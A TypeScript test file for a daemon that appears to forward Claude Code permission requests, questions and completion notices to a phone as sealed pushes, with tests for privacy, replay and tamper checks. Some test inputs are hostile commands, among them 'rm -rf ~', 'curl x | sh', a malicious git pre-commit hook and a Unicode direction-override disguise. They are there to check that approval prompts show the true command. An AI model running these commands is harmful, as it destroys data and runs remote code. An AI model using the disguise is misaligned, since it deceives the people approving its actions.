import fs from 'node:fs'
import path from 'node:path'
import {
  bind,
  buildCommand,
  type CommandBody,
  generateVaultKey,
  importVaultKey,
  open,
  type PushInfo,
  type RequestInfo,
  type SessionInfo,
  type SourceMessage,
} from '@agentwatch/protocol'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import {
  ClaudeAdapter,
  claudeFailure,
  claudeWindows,
  describeTool,
  hookOutput,
  matchKey,
} from '../src/adapters/claude.ts'
import { type AgentAdapter, Core, type CoreOptions } from '../src/daemon/core.ts'
import { CLI_DIR, loadClaudeFixture } from './harness.ts'

const SOURCE = 'src-1'
const fixture = loadClaudeFixture()
const byEvent = (name: string, n = 0) => fixture.filter((e) => e.hook_event_name === name)[n]!
const SID = String(fixture[0]!.session_id)
/** `$.session.usage()` after a turn, recorded from Claude Code 2.1.323 (spike 00). */
const RECORDED_USAGE = (
  JSON.parse(fs.readFileSync(path.join(CLI_DIR, 'test/fixtures/claude-2.1.323-busy-submit-usage.json'), 'utf8')) as {
    mod: { ev: string; usage?: Record<string, unknown> }[]
  }
).mod.find((e) => e.ev === 'usage')!.usage!

let key: CryptoKey
let sent: SourceMessage[]

async function makeCore(over: Partial<CoreOptions> = {}) {
  key = await importVaultKey(generateVaultKey())
  sent = []
  const core = new Core({
    sourceId: SOURCE,
    key,
    privacy: 'full',
    allowMessages: true,
    doneMinSeconds: 30,
    needsYouDelayMs: 0,
    send: (m) => sent.push(m),
    log: () => {},
    startedAt: Date.now() - 1000,
    ...over,
  })
  const claude = new ClaudeAdapter(core, { holdMs: 60_000, log: () => {} })
  core.register(claude)
  return { core, claude }
}

const of = <T extends SourceMessage['t']>(t: T) => sent.filter((m) => m.t === t) as Extract<SourceMessage, { t: T }>[]
const lastSession = () => of('session').at(-1)!.session

async function command(body: CommandBody, extra: { requestId?: string; sessionId?: string; sourceId?: string } = {}) {
  return buildCommand(key, { deviceId: 'dev-1', sourceId: SOURCE, sessionId: SID, ...extra, body })
}

afterEach(() => {
  vi.useRealTimers()
})

describe('Claude adapter helpers', () => {
  it('matches a PostToolUse to its PermissionRequest even though the answer was added to the input', () => {
    const req = byEvent('PermissionRequest', 1)
    const post = byEvent('PostToolUse', 1)
    expect(matchKey(req.tool_name, req.tool_input)).toBe(matchKey(post.tool_name, post.tool_input))
    expect(matchKey('Bash', { command: 'ls' })).not.toBe(matchKey('Bash', { command: 'rm -rf /' }))
  })

  it('matches a question answered at the terminal, which also gets `annotations` (Claude Code 2.1.322)', () => {
    const req = byEvent('PermissionRequest', 1)
    const post = byEvent('PostToolUse', 1)
    const key = matchKey(req.tool_name, req.tool_input)
    const answered = (extra: Record<string, unknown>) =>
      matchKey(post.tool_name, { ...(post.tool_input as Record<string, unknown>), ...extra })
    expect(answered({ annotations: {} })).toBe(key)
    expect(answered({ annotations: { 'Ship it?': { notes: 'after lunch' } } })).toBe(key)
    expect(matchKey('AskUserQuestion', { questions: [{ question: 'Deploy?' }] })).not.toBe(key)
  })

  it('names what stopped a turn the way every agent does', () => {
    expect(claudeFailure('rate_limit', 'You have hit your limit · resets 3:40pm')).toEqual({
      kind: 'usage_limit',
      detail: 'You have hit your limit · resets 3:40pm',
    })
    expect(claudeFailure('overloaded', undefined)).toEqual({ kind: 'overloaded' })
    expect(claudeFailure('authentication_failed', '').kind).toBe('auth')
    expect(claudeFailure('invalid_request', 'prompt is too long: 210000 tokens > 200000').kind).toBe('context_full')
    expect(claudeFailure('something_new', undefined)).toEqual({ kind: 'error' })
  })

  it('keeps the name of a window it has no word for, and reads each window once', () => {
    const resetsAt = '2026-11-13T14:00:00.000Z'
    expect(
      claudeWindows([
        { kind: 'five_hour', percentUsed: 23, resetsAt },
        { kind: 'spend_limit', percentUsed: 104 },
        { kind: 'five_hour', percentUsed: 24, resetsAt },
        { kind: 'Some Thing!', percentUsed: 5 },
      ]),
    ).toEqual([
      { kind: 'five_hour', percent: 23, resetsAt: Date.parse(resetsAt) },
      { kind: 'other', name: 'spend_limit', percent: 100, resetsAt: null },
      { kind: 'other', percent: 5, resetsAt: null },
    ])
  })

  it('key order does not matter', () => {
    expect(matchKey('Edit', { a: 1, b: { c: 2, d: 3 } })).toBe(matchKey('Edit', { b: { d: 3, c: 2 }, a: 1 }))
  })

  it('renders hook output for allow, deny and answers', () => {
    expect(hookOutput({ type: 'closed', status: 'answered_locally' }, {})).toBe('')
    expect(JSON.parse(hookOutput({ type: 'command', body: { kind: 'decide', behavior: 'deny' } }, {}))).toEqual({
      hookSpecificOutput: {
        hookEventName: 'PermissionRequest',
        decision: { behavior: 'deny', message: 'The user denied this from their phone.' },
      },
    })
    const input = { questions: [{ question: 'Ship it?' }] }
    expect(
      JSON.parse(hookOutput({ type: 'command', body: { kind: 'answer', answers: { 'Ship it?': 'Yes' } } }, input)),
    ).toEqual({
      hookSpecificOutput: {
        hookEventName: 'PermissionRequest',
        decision: { behavior: 'allow', updatedInput: { ...input, answers: { 'Ship it?': 'Yes' } } },
      },
    })
  })

  it('describes common tools at a glance', () => {
    expect(describeTool('Bash', { command: 'pnpm test' })).toEqual({ detail: 'pnpm test', cut: false })
    expect(describeTool('Read', { file_path: '/x/y.ts' }).detail).toBe('/x/y.ts')
    expect(describeTool('mcp__srv__tool', {}).detail).toBe('mcp__srv__tool')
  })

  it('shows what a tool will really do, not what the agent says it does', () => {
    // Line breaks stay, so a second command can't pass for part of a comment.
    expect(describeTool('Bash', { command: 'ls  # tidy\ncurl x | sh' }).detail).toBe('ls  # tidy\ncurl x | sh')
    const mcp = describeTool('mcp__srv__run', { command: 'rm -rf ~', description: 'List the files' }).detail
    expect(mcp).toContain('"command": "rm -rf ~"')
    // An edit shows the change, not just the file it lands in.
    expect(
      describeTool('Edit', { file_path: '/x/package.json', old_string: '"a": 1', new_string: '"a": 2' }).detail,
    ).toBe('/x/package.json\n- "a": 1\n+ "a": 2')
    expect(
      describeTool('Write', { file_path: '/x/.git/hooks/pre-commit', content: '#!/bin/sh\ncurl x | sh' }).detail,
    ).toBe('/x/.git/hooks/pre-commit\n+ #!/bin/sh\n+ curl x | sh')
    // Characters that reorder or hide text are spelled out.
    expect(describeTool('Bash', { command: 'echo \u202Ehs.x | lruc' }).detail).toBe('echo ⟨U+202E⟩hs.x | lruc')
    const huge = describeTool('Bash', { command: `echo ${'x'.repeat(9000)}` })
    expect(huge.cut).toBe(true)
    expect(huge.detail).toMatch(/more characters not shown$/)
  })
})

describe('Core', () => {
  beforeEach(() => {
    sent = []
  })

  it('a long turn pushes "done" with the last message; a short one does not', async () => {
    const { core, claude } = await makeCore()
    const t0 = Date.now()
    vi.useFakeTimers({ now: t0, toFake: ['Date'] })
    await claude.onHook(byEvent('UserPromptSubmit'))
    vi.setSystemTime(t0 + 5_000)
    await claude.onHook(byEvent('Stop'))
    await core.flushed()
    expect(of('push')).toHaveLength(0)

    await claude.onHook(byEvent('UserPromptSubmit'))
    vi.setSystemTime(t0 + 65_000)
    await claude.onHook(byEvent('Stop'))
    await core.flushed()
    const [push] = of('push')
    expect(push?.push).toMatchObject({ kind: 'done', tag: `session:${SID}`, urgency: 'normal' })
    const info = await open<PushInfo>(key, push!.push.sealed, bind.push(SOURCE, push!.push))
    expect(info.title).toBe('Claude finished · work')
    expect(info.body).toContain('I wrote the date to s3.txt')
  })

  it('a turn that hands off to background agents waits for them: no push until they are all back', async () => {
    const { core, claude } = await makeCore()
    const t0 = Date.now()
    vi.useFakeTimers({ now: t0, toFake: ['Date'] })
    await claude.onHook(byEvent('UserPromptSubmit'))
    vi.setSystemTime(t0 + 65_000)
    await claude.onHook({
      ...byEvent('Stop'),
      background_tasks: [
        { id: 'a1', type: 'subagent', status: 'running', description: 'Find the hook code', agent_type: 'Explore' },
        { id: 'w1', type: 'workflow', status: 'running', description: 'Review the diff', name: 'review-changes' },
        { id: 'b1', type: 'shell', status: 'running', description: 'Dev server', command: 'pnpm dev' },
      ],
    })
    await core.flushed()
    expect(of('push')).toHaveLength(0)
    expect(core.sessions.get(SID)?.state).toBe('working')
    expect(lastSession().background).toBe(2)
    const info = await open<SessionInfo>(key, lastSession().sealed!, bind.session(SOURCE, SID))
    expect(info.background).toEqual(['Agent · Explore: Find the hook code', 'Workflow · review-changes'])
    expect(of('event').map((m) => m.event.kind)).toContain('waiting')

    // The agents come back: their notice starts a turn, and this time nothing is left running.
    vi.setSystemTime(t0 + 200_000)
    await claude.onHook({ ...byEvent('UserPromptSubmit'), prompt: '<task-notification><status>completed</status>' })
    await claude.onHook({ ...byEvent('Stop'), background_tasks: [] })
    await core.flushed()
    expect(of('push').map((m) => m.push.kind)).toEqual(['done'])
    expect(core.sessions.get(SID)?.state).toBe('idle')
  })

  it('a dev server or monitor left running does not hold the turn open: it is done', async () => {
    const { core, claude } = await makeCore()
    const t0 = Date.now()
    vi.useFakeTimers({ now: t0, toFake: ['Date'] })
    await claude.onHook(byEvent('UserPromptSubmit'))
    vi.setSystemTime(t0 + 65_000)
    await claude.onHook({
      ...byEvent('Stop'),
      background_tasks: [
        { id: 'b1', type: 'shell', status: 'running', description: 'Dev server', command: 'pnpm dev' },
        { id: 'm1', type: 'monitor', status: 'running', description: 'Watch the logs' },
        { id: 'a1', type: 'subagent', status: 'completed', description: 'Already back' },
      ],
    })
    await core.flushed()
    expect(core.sessions.get(SID)?.state).toBe('idle')
    expect(of('push').map((m) => m.push.kind)).toEqual(['done'])
  })

  it("a turn that stops on a usage limit pushes at once, loudly, with Claude's own words", async () => {
    const { core, claude } = await makeCore()
    await claude.onHook(byEvent('UserPromptSubmit'))
    // Shape from Claude Code 2.1.323's StopFailureHookInput (not yet captured live: it needs a real limit).
    await claude.onHook({
      ...byEvent('Stop'),
      hook_event_name: 'StopFailure',
      error: 'rate_limit',
      error_details: 'You have hit your limit · resets 3:40pm',
    })
    await core.flushed()
    expect(core.sessions.get(SID)?.state).toBe('idle')
    const push = of('push')[0]!.push
    expect(push).toMatchObject({ kind: 'failed', tag: `session:${SID}`, urgency: 'high', actions: false })
    expect(await open<PushInfo>(key, push.sealed, bind.push(SOURCE, push))).toEqual({
      title: 'Claude stopped: usage limit reached · work',
      body: 'You have hit your limit · resets 3:40pm',
    })
    const info = await open<SessionInfo>(key, lastSession().sealed!, bind.session(SOURCE, SID))
    expect(info.failure).toEqual({ kind: 'usage_limit', detail: 'You have hit your limit · resets 3:40pm' })
    const ev = of('event').at(-1)!.event
    expect(ev.kind).toBe('failed')
    expect(await open(key, ev.sealed!, bind.event(SOURCE, { ...ev, sessionId: SID }))).toEqual({
      text: 'Usage limit reached\nYou have hit your limit · resets 3:40pm',
    })
  })

  it('summary privacy: a failure says what kind, never the error text', async () => {
    const { core, claude } = await makeCore({ privacy: 'summary' })
    await claude.onHook(byEvent('UserPromptSubmit'))
    await claude.onHook({
      ...byEvent('Stop'),
      hook_event_name: 'StopFailure',
      error: 'overloaded',
      error_details: 'secret',
    })
    await core.flushed()
    const push = of('push')[0]!.push
    expect(await open<PushInfo>(key, push.sealed, bind.push(SOURCE, push))).toEqual({
      title: 'Claude stopped: servers busy · work',
      body: 'The servers were overloaded. Try again in a minute.',
    })
    const info = await open<SessionInfo>(key, lastSession().sealed!, bind.session(SOURCE, SID))
    expect(info).toEqual({ project: 'work', failure: { kind: 'overloaded' } })
    expect(JSON.stringify(sent)).not.toContain('secret')
  })

  it('summary privacy keeps free text on the machine', async () => {
    const { core, claude } = await makeCore({ privacy: 'summary' })
    await claude.onHook(byEvent('UserPromptSubmit'))
    const held = claude.onHook(byEvent('PermissionRequest', 1))
    await core.flushed()
    const info = await open<SessionInfo>(key, lastSession().sealed!, bind.session(SOURCE, SID))
    expect(info).toEqual({ project: 'work' })
    const req = of('request.open')[0]!.request
    expect(req.answerable).toBe(false)
    expect(await open<RequestInfo>(key, req.sealed, bind.request(SOURCE, req))).toEqual({
      title: 'Question',
      tool: 'AskUserQuestion',
    })
    const push = of('push')[0]!.push
    expect(push.actions).toBe(false)
    const pinfo = await open<PushInfo>(key, push.sealed, bind.push(SOURCE, push))
    expect(pinfo).toEqual({ title: 'Claude has a question · work', body: 'Open to answer.' })
    expect(of('event').every((m) => m.event.sealed === undefined)).toBe(true)
    // Answering an unanswerable request from the phone is refused.
    await core.handleCommand(await command({ kind: 'answer', answers: { 'Ship it?': 'Yes' } }, { requestId: req.id }))
    expect(of('command.ack').at(-1)).toMatchObject({ status: 'rejected' })
    await claude.onHook(byEvent('PostToolUse', 1))
    expect(await held).toBe('')
  })

  it('summary privacy: a long turn still says "done", without the last message', async () => {
    const { core, claude } = await makeCore({ privacy: 'summary' })
    const t0 = Date.now()
    vi.useFakeTimers({ now: t0, toFake: ['Date'] })
    await claude.onHook(byEvent('UserPromptSubmit'))
    vi.setSystemTime(t0 + 65_000)
    await claude.onHook(byEvent('Stop'))
    await core.flushed()
    const [push] = of('push')
    expect(push?.push.kind).toBe('done')
    const info = await open<PushInfo>(key, push!.push.sealed, bind.push(SOURCE, push!.push))
    expect(info.title).toBe('Claude finished · work')
    expect(JSON.stringify(info)).not.toContain('s3.txt')
    const sinfo = await open<SessionInfo>(key, lastSession().sealed!, bind.session(SOURCE, SID))
    expect(JSON.stringify(sinfo)).not.toContain('s3.txt')
    expect(of('event').every((m) => m.event.sealed === undefined)).toBe(true)
  })

  it('waits before pushing needs_you, and skips the push if it was answered at the keyboard', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] })
    const { core, claude } = await makeCore({ needsYouDelayMs: 10_000 })
    await claude.onHook(byEvent('UserPromptSubmit'))
    const held = claude.onHook(byEvent('PermissionRequest', 0))
    await vi.advanceTimersByTimeAsync(3_000)
    await claude.onHook(byEvent('PostToolUse', 0))
    expect(await held).toBe('')
    await vi.advanceTimersByTimeAsync(20_000)
    await core.flushed()
    expect(of('push')).toHaveLength(0)

    const held2 = claude.onHook(byEvent('PermissionRequest', 0))
    await vi.advanceTimersByTimeAsync(10_500)
    await core.flushed()
    expect(of('push').map((m) => m.push.kind)).toEqual(['needs_you'])
    core.stop()
    expect(await held2).toBe('')
  })

  it('seals each push and request to its clear fields, so the relay cannot repoint them', async () => {
    const { core, claude } = await makeCore()
    await claude.onHook(byEvent('UserPromptSubmit'))
    const held = claude.onHook(byEvent('PermissionRequest', 0))
    await core.flushed()
    const req = of('request.open')[0]!.request
    const push = of('push')[0]!.push
    expect(push).toMatchObject({ kind: 'needs_you', requestId: req.id, tag: `req:${req.id}`, actions: true })
    await expect(open(key, push.sealed, bind.push(SOURCE, push))).resolves.toBeTruthy()
    for (const swap of [{ requestId: 'r-other' }, { sessionId: 's-other' }, { kind: 'done' }, { actions: false }]) {
      await expect(open(key, push.sealed, bind.push(SOURCE, { ...push, ...swap }))).rejects.toThrow()
    }
    await expect(open(key, push.sealed, bind.push('another-source', push))).rejects.toThrow()
    // A permission presented as a question (or back) doesn't open either.
    await expect(open(key, req.sealed, bind.request(SOURCE, { ...req, kind: 'question' }))).rejects.toThrow()
    core.stop()
    await held
  })

  it('a command too long to show in full is answered at the computer', async () => {
    const { core, claude } = await makeCore()
    await claude.onHook(byEvent('UserPromptSubmit'))
    const big = byEvent('PermissionRequest', 0)
    const held = claude.onHook({ ...big, tool_input: { command: `echo ${'x'.repeat(9000)}` } })
    await core.flushed()
    const req = of('request.open')[0]!.request
    expect(req.answerable).toBe(false)
    expect(of('push')[0]!.push.actions).toBe(false)
    await core.handleCommand(await command({ kind: 'decide', behavior: 'allow' }, { requestId: req.id }))
    expect(of('command.ack').at(-1)).toMatchObject({ status: 'rejected' })
    core.stop()
    await held
  })

  it('approves only permissions and answers only questions', async () => {
    const { core, claude } = await makeCore()
    await claude.onHook(byEvent('UserPromptSubmit'))
    const held = claude.onHook(byEvent('PermissionRequest', 1))
    await core.flushed()
    const q = of('request.open')[0]!.request
    expect(q.kind).toBe('question')
    await core.handleCommand(await command({ kind: 'decide', behavior: 'allow' }, { requestId: q.id }))
    expect(of('command.ack').at(-1)).toMatchObject({
      status: 'rejected',
      detail: 'A question needs an answer, not approval',
    })
    await core.handleCommand(await command({ kind: 'answer', answers: { 'Ship it?': 'Yes' } }, { requestId: q.id }))
    expect(of('command.ack').at(-1)).toMatchObject({ status: 'applied' })
    expect(JSON.parse(await held)).toMatchObject({ hookSpecificOutput: { decision: { behavior: 'allow' } } })
  })

  it('a command the relay resends gets the same ack and is applied once', async () => {
    const { core, claude } = await makeCore()
    await claude.onHook(byEvent('UserPromptSubmit'))
    const held = claude.onHook(byEvent('PermissionRequest', 0))
    await core.flushed()
    const req = of('request.open')[0]!.request
    const cmd = await command({ kind: 'decide', behavior: 'allow' }, { requestId: req.id })
    await core.handleCommand(cmd)
    await core.handleCommand(cmd)
    expect(of('command.ack').map((a) => a.status)).toEqual(['applied', 'applied'])
    expect(JSON.parse(await held)).toMatchObject({ hookSpecificOutput: { decision: { behavior: 'allow' } } })
  })

  it('rejects commands for another source and stale timestamps; a replay changes nothing', async () => {
    const { core, claude } = await makeCore()
    await claude.onHook(byEvent('UserPromptSubmit'))
    const held = claude.onHook(byEvent('PermissionRequest', 0))
    await core.flushed()
    const req = of('request.open')[0]!.request

    await core.handleCommand(
      await command({ kind: 'decide', behavior: 'allow' }, { requestId: req.id, sourceId: 'other' }),
    )
    expect(of('command.ack').at(-1)).toMatchObject({ status: 'rejected', detail: 'wrong source' })

    const old = await buildCommand(key, {
      deviceId: 'd',
      sourceId: SOURCE,
      sessionId: SID,
      requestId: req.id,
      body: { kind: 'decide', behavior: 'allow' },
      now: Date.now() - 60 * 60_000,
    })
    await core.handleCommand(old)
    expect(of('command.ack').at(-1)).toMatchObject({ status: 'rejected', detail: 'expired' })

    const ok = await command({ kind: 'decide', behavior: 'deny', message: 'not now' }, { requestId: req.id })
    await core.handleCommand(ok)
    expect(JSON.parse(await held).hookSpecificOutput.decision).toEqual({ behavior: 'deny', message: 'not now' })
    // A replay is the identical envelope (the command id is inside the seal's binding): it gets the original ack and
    // changes nothing.
    const acks = of('command.ack').length
    await core.handleCommand(ok)
    expect(of('command.ack').slice(acks)).toEqual([{ t: 'command.ack', commandId: ok.commandId, status: 'applied' }])
  })

  it('a tampered command is rejected', async () => {
    const { core } = await makeCore()
    const env = await command({ kind: 'message', text: 'hi' })
    await core.handleCommand({ ...env, kind: 'decide', requestId: 'r' })
    expect(of('command.ack').at(-1)).toMatchObject({ status: 'rejected', detail: 'bad seal' })
  })

  it('delivers messages only to idle sessions, and only when allowed', async () => {
    const delivered: string[] = []
    const fake: AgentAdapter = {
      agent: 'generic',
      describe: () => 'fake',
      message: async (_id, text) => {
        delivered.push(text)
        return { ok: true }
      },
    }
    const { core } = await makeCore()
    core.register(fake)
    core.apply('generic', SID, { type: 'turn.start', at: Date.now() })
    await core.handleCommand(await command({ kind: 'message', text: 'too early' }))
    expect(of('command.ack').at(-1)).toMatchObject({ status: 'rejected' })
    core.apply('generic', SID, { type: 'turn.end', at: Date.now(), message: 'done' })
    await core.handleCommand(await command({ kind: 'message', text: 'next: run the tests' }))
    expect(of('command.ack').at(-1)).toMatchObject({ status: 'applied' })
    expect(delivered).toEqual(['next: run the tests'])

    const off = await makeCore({ allowMessages: false })
    off.core.register(fake)
    off.core.apply('generic', SID, { type: 'session.start', at: Date.now() })
    await off.core.handleCommand(await command({ kind: 'message', text: 'nope' }))
    expect(of('command.ack').at(-1)).toMatchObject({
      status: 'rejected',
      detail: 'Messages are turned off for this machine',
    })
    await off.core.flushed()
    expect(lastSession().caps).toEqual({ reply: false, replyReason: 'Messages are turned off for this machine' })
  })

  it('a busy session takes a reply when its adapter can queue or steer it, and says which', async () => {
    const got: [string, boolean][] = []
    const fake: AgentAdapter = {
      agent: 'generic',
      describe: () => 'fake',
      message: async (_id, text, o) => {
        got.push([text, o.busy])
        return o.busy ? { ok: true, how: 'queued' } : { ok: true }
      },
    }
    const { core } = await makeCore()
    core.register(fake)
    core.apply('generic', SID, { type: 'turn.start', at: Date.now() })
    core.setCaps(SID, { reply: true, busyReply: 'queue' })
    await core.flushed()
    expect(lastSession().caps).toEqual({ reply: true, busyReply: 'queue' })

    await core.handleCommand(await command({ kind: 'message', text: 'and update the docs' }))
    expect(got).toEqual([['and update the docs', true]])
    expect(of('command.ack').at(-1)).toMatchObject({
      status: 'applied',
      detail: 'Sends when the agent finishes this turn',
    })
    await core.flushed()
    const queued = of('event').at(-1)!.event
    expect(queued.kind).toBe('queued')
    expect(await open(key, queued.sealed!, bind.event(SOURCE, { ...queued, sessionId: SID }))).toEqual({
      text: 'and update the docs',
    })

    // Idle, the same adapter just delivers it.
    core.apply('generic', SID, { type: 'turn.end', at: Date.now() })
    await core.handleCommand(await command({ kind: 'message', text: 'thanks' }))
    expect(got.at(-1)).toEqual(['thanks', false])
    expect(of('command.ack').at(-1)).toEqual({ t: 'command.ack', commandId: expect.any(String), status: 'applied' })
    await core.flushed()
    expect(of('event').at(-1)!.event.kind).toBe('replied')

    // An adapter that can't queue still refuses a busy session.
    core.setCaps(SID, { reply: true })
    core.apply('generic', SID, { type: 'turn.start', at: Date.now() })
    await core.flushed()
    expect(lastSession().caps).toEqual({ reply: false, replyReason: 'You can reply when the agent is idle' })
    await core.handleCommand(await command({ kind: 'message', text: 'too early' }))
    expect(of('command.ack').at(-1)).toMatchObject({ status: 'rejected' })
    expect(got).toHaveLength(2)
  })

  it("passes the account's rate limits on sealed, and the session's context and cost (recorded usage)", async () => {
    const { core, claude } = await makeCore()
    await claude.onHook(byEvent('UserPromptSubmit'))
    claude.onUsage(SID, RECORDED_USAGE)
    await core.flushed()
    const msg = of('usage').at(-1)!
    expect(await open(key, msg.sealed, bind.usage(SOURCE))).toEqual({
      claude: {
        at: msg.at,
        windows: [
          { kind: 'five_hour', percent: 23, resetsAt: Date.parse('2026-11-13T14:00:00.000Z') },
          { kind: 'seven_day', percent: 54, resetsAt: Date.parse('2026-11-16T11:00:00.000Z') },
        ],
      },
    })
    await expect(open(key, msg.sealed, bind.usage('another-source'))).rejects.toThrow()
    const info = await open<SessionInfo>(key, lastSession().sealed!, bind.session(SOURCE, SID))
    expect(info.usage).toEqual({ contextPercent: 4, costUsd: 0.00427476 })
    // Figures aren't conversation: the phone dates the latest message by `updatedAt`, and refetches when it moves.
    expect(lastSession().updatedAt).toBe(core.sessions.get(SID)!.stateSince)

    // Every reconnect re-sends the limits after the snapshot, so a report made while offline still arrives.
    const [, again] = (await core.snapshot()) as [unknown, Extract<SourceMessage, { t: 'usage' }>]
    expect(await open(key, again.sealed, bind.usage(SOURCE))).toEqual(await open(key, msg.sealed, bind.usage(SOURCE)))

    // The same figures again: nothing new to send.
    const n = of('usage').length
    claude.onUsage(SID, RECORDED_USAGE)
    await core.flushed()
    expect(of('usage')).toHaveLength(n)
  })

  it('pushes once when a window crosses 90%, never on first sight, and not at all when turned off', async () => {
    const w = (percent: number) => [{ kind: 'five_hour' as const, percent, resetsAt: Date.now() + 80 * 60_000 }]
    const { core } = await makeCore()
    core.setUsage('claude', w(95)) // first sight: already past the line, stays quiet
    core.setUsage('claude', w(60))
    core.setUsage('claude', w(91))
    core.setUsage('claude', w(89))
    core.setUsage('claude', w(93)) // the same window again: already pushed
    await core.flushed()
    const pushes = of('push')
    expect(pushes).toHaveLength(1)
    const push = pushes[0]!.push
    expect(push).toMatchObject({ kind: 'limit', tag: 'limit:claude:five_hour', urgency: 'normal', actions: false })
    expect(await open<PushInfo>(key, push.sealed, bind.push(SOURCE, push))).toEqual({
      title: 'Claude’s 5-hour limit is at 91%',
      body: 'It resets in 1h 20m.',
    })

    // Its reset time jitters across the half hour: still the same window, still pushed once.
    const at = Math.floor(Date.now() / 3_600_000) * 3_600_000 + 5 * 3_600_000 + 30 * 60_000
    const jit = (percent: number, d: number) => [{ kind: 'seven_day' as const, percent, resetsAt: at + d }]
    core.setUsage('codex', jit(50, -1000))
    core.setUsage('codex', jit(90, -1000))
    core.setUsage('codex', jit(85, 1000))
    core.setUsage('codex', jit(92, 1000))
    // The next week's window is a new one: it may push again.
    core.setUsage('codex', jit(10, 7 * 86_400_000))
    core.setUsage('codex', jit(95, 7 * 86_400_000))
    await core.flushed()
    expect(of('push').filter((p) => p.push.tag === 'limit:codex:seven_day')).toHaveLength(2)

    const off = await makeCore({ limitPercent: 0 })
    off.core.setUsage('codex', w(10))
    off.core.setUsage('codex', w(99))
    await off.core.flushed()
    expect(of('push')).toHaveLength(0)
  })

  it('restores sessions after a restart without their dead held requests', async () => {
    const { core, claude } = await makeCore()
    await claude.onHook(byEvent('UserPromptSubmit'))
    void claude.onHook(byEvent('PermissionRequest', 0))
    const saved = JSON.parse(JSON.stringify(core.exportSessions()))
    expect(saved[0].state).toBe('needs_you')

    const next = await makeCore()
    next.core.restoreSessions(saved)
    expect(next.core.sessions.get(SID)).toMatchObject({ state: 'working', openRequests: [] })
    const [snap, ...rest] = (await next.core.snapshot()) as [Extract<SourceMessage, { t: 'snapshot' }>]
    expect(snap.sessions.map((s) => s.id)).toEqual([SID])
    expect(rest).toEqual([]) // no usage known yet
    expect(snap.requests).toEqual([])
    core.stop()
  })
})
